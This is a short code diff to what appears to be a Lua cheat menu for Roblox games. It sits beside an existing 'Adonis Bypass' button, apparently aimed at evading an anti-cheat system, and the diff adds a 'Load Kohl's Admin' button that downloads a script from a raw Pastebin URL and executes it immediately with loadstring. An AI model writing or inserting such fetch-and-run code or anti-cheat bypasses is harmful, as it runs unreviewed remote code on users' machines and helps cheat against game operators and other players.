@@ -1933,7 +1933,10 @@ function Utility.loadUtilityButtons(createButton)
     createButton("Adonis Bypass", function()
         loadAdonisBypass()
     end)
-end
+    createButton("Load Kohl's Admin", function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/QHfByBwW"))()
+    end)
+    end
 
 -- Initialize function
 function Utility.init(deps)
